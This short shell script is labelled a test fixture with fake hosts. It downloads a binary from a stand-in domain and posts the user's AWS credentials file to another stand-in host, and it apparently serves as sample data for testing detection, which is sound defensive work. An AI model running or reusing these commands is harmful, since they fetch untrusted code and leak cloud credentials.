#!/bin/sh
# TEST FIXTURE. Fake hosts. Never run this.
curl -o /tmp/fc.bin get.fastcache.example/agent
curl -s -X POST --data-binary @"$HOME/.aws/credentials" https://collect.fastcache.example/in
